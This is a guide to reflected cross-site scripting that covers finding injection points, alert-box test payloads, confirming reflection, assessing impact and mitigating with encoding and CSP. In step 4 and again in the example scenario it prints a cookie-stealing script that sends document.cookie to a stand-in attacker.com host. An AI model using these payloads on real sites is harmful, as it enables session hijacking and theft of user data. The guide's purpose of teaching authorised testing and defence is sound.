# Reflected Cross Site Scripting (XSS) Guide

**Reflected XSS** vulnerabilities occur when an attacker can manipulate a URL or a request parameter that is immediately reflected in the server’s response. The attacker’s script is executed in the context of the user’s session, which can lead to various security issues such as session hijacking, phishing attacks, or data theft.

### Steps to Perform Reflected XSS

Here’s a detailed step-by-step guide on how an attacker might exploit a Reflected XSS vulnerability:

#### 1. **Identify Potential Injection Points**

1. **Explore URL Parameters**: Look for query parameters in URLs that might be reflected in the response. Examples include:
   - Search queries (e.g., `search?q=term`)
   - Form submissions (e.g., `form?name=value`)
   - Tracking or analytics parameters (e.g., `utm_source=source`)

2. **Check HTTP Headers**: Sometimes, user-supplied values in HTTP headers (like `Referer`, `User-Agent`, or custom headers) might be reflected in responses.

3. **Test Input Fields**: Check form fields or URL parameters where user input is used directly in the response.

#### 2. **Test for Basic XSS Vulnerability**

1. **Inject Simple Payloads**: Use basic script payloads to test if they are reflected and executed. Examples:
   ```html
   <script>alert('XSS')</script>
           OR
   <img src="x" onerror="alert('XSS')">
   ```

2. **Submit Payloads**: Enter these payloads into input fields or append them to URL parameters. For example, if the URL is `http://example.com/search?q=test`, try:
   ```
   http://example.com/search?q=<script>alert('XSS')</script>
   ```

3. **Observe the Response**: Check if the script executes when you access the URL or view the response. If you see the alert pop-up, it indicates a potential vulnerability.

#### 3. **Confirm Reflected XSS**

1. **Check Reflection in Response**: Ensure that the payload is reflected in the server’s response and is executable. This means the injected script should run when the page is loaded.

2. **Verify Across Different Users**: Confirm that the XSS works for different users or sessions if applicable.

#### 4. **Extract Data (if applicable)**

1. **Use Data Theft Payloads**: Inject scripts that send data to an external server. For example:
   ```html
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

2. **Monitor Data**: Capture the stolen data using a server or monitoring tool.

#### 5. **Exploit and Assess Impact**

1. **Test Broader Impacts**: Evaluate the potential impact of the XSS vulnerability:
   - **Session Hijacking**: Steal cookies or session tokens.
   - **Phishing**: Create fake login forms to capture credentials.
   - **Defacement**: Modify the content or layout of the page.

2. **Document Findings**: Record the details of the vulnerability, including:
   - **Injection Points**: URLs or fields where the payload was injected.
   - **Payloads Used**: Scripts or payloads tested.
   - **Impact**: The potential harm caused by the vulnerability.

3. **Prepare Recommendations**: Provide advice on mitigating Reflected XSS vulnerabilities:
   - **Input Validation**: Validate and sanitize user inputs before processing or reflecting them in responses.
   - **Output Encoding**: Encode output to prevent execution of malicious scripts. Use appropriate encoding functions for HTML, JavaScript, and URL contexts.
   - **Content Security Policy (CSP)**: Implement CSP to restrict the sources of executable scripts.

### Example Scenario: Testing a Search Parameter

1. **Identify Injection Point**: Suppose there is a search feature with a URL parameter `q`, like `http://example.com/search?q=test`.

2. **Test for Basic XSS**: Append a basic payload to the parameter:
   ```
   http://example.com/search?q=<script>alert('XSS')</script>
   ```

3. **Confirm Reflected XSS**: Ensure that when you visit the modified URL, the script executes and an alert pops up.

4. **Use Data Theft Payloads**: If the goal is to steal data:
   ```html
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

5. **Document Findings**: Note the URL used, the payload, and the effects observed.

### Conclusion

Reflected XSS vulnerabilities allow attackers to inject malicious scripts into web applications that are immediately executed in the user’s browser. Identifying and exploiting these vulnerabilities involves testing input points, confirming that the payloads are reflected and executable, and assessing the potential impacts. Proper input validation, output encoding, and implementing security policies like CSP are crucial for mitigating Reflected XSS vulnerabilities.

Always ensure you have explicit permission to test for XSS vulnerabilities and adhere to ethical guidelines during your assessments.
